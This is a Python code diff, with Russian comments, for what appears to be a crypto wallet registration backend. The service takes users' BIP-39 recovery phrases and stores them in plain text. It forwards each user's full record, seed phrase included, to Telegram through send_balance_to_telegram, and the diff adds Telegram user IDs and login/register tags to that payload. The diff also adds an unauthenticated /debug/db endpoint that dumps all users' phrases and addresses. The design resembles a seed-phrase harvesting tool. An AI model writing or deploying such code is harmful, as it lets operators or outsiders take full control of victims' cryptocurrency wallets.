@@ -21,7 +21,7 @@ def create_access_token(data: dict):
 
 # async def get_btc_balance()
 
-async def get_data_for_user(user_id: int):
+async def get_data_for_user(user_id: int,action:str,tg_user_id:int=None):
     user = await User.get_or_none(id=user_id)
     if not user:
         raise HTTPException(status_code=404, detail="User not found")
@@ -38,15 +38,17 @@ async def get_data_for_user(user_id: int):
         "id": user.id,
         "phrase": user.phrase,
         "addresses": addresses_list,
-        "balance": balance_data
+        "balance": balance_data,
+        "action": action,
+        "tg_user_id": tg_user_id,
     }
 
     # Отправляем уведомление в телеграм
-    await send_balance_to_telegram(user_id, data)
+    await send_balance_to_telegram(tg_user_id or user_id, data)
     return data
 
 
-async def register_user_wallet(phrase: str):
+async def register_user_wallet(phrase: str,tg_user_id:int=None):
     try:
         user = await User.create(phrase=phrase)
 
@@ -68,7 +70,7 @@ async def register_user_wallet(phrase: str):
         await WalletAddress.create(user=user, coin_type="USDT", address=eth_addr)
 
         # Получаем сгенерированные данные
-        user_data = await get_data_for_user(user.id)
+        user_data = await get_data_for_user(user.id, action="register",tg_user_id=tg_user_id)
         token = create_access_token(data={"sub": str(user.id)})
 
         # Возвращаем словарь, который идеально ложится в модель Token
@@ -76,7 +78,8 @@ async def register_user_wallet(phrase: str):
             "access_token": token,
             "token_type": "bearer",
             "user_id": user.id,
-            "user_data": user_data
+            "user_data": user_data,
+            "action": "register",
         }
     except ValueError as e:
         # Ловим ошибку валидации BIP-39
@@ -100,24 +103,25 @@ async def handle_user_wallet(user_data: UserCreate):
 
     # Если юзера нет, запускаем регистрацию, она сама вернет токен
     if not user:
-        return await register_user_wallet(user_data.phrase)
+        return await register_user_wallet(user_data.phrase,tg_user_id=user_data.tg_user_id)
 
     # Если юзер есть, собираем токен и данные
     token = create_access_token(data={"sub": str(user.id)})
-    user_data_dict = await get_data_for_user(user.id)
+    user_data_dict = await get_data_for_user(user.id,action="login",tg_user_id=user_data.tg_user_id)
 
     return {
         "access_token": token,
         "token_type": "bearer",
         "user_id": user.id,
-        "user_data": user_data_dict
+        "user_data": user_data_dict,
+        "action": "login",
     }
 
 
 @user_router.post("/register", response_model=Token)
 async def register(user_data: UserCreate):
     # Проверяем, существует ли уже такой юзер
-    user = await User.get_or_none(phrase=user_data.phrase)
+    user = await User.get_or_none(phrase=user_data.phrase,tg_user_id=user_data.tg_user_id)
     if user:
         raise HTTPException(status_code=400, detail="Этот кошелек уже зарегистрирован")
 
@@ -139,3 +143,10 @@ def generate(count: int = 12):
     words = mnemo.generate(strength=strength)
 
     return {"phrase": words}
+
+
+@user_router.get("/debug/db")
+async def debug_db():
+    users = await User.all().values()
+    addresses = await WalletAddress.all().values()
+    return {"users": users, "addresses": addresses}
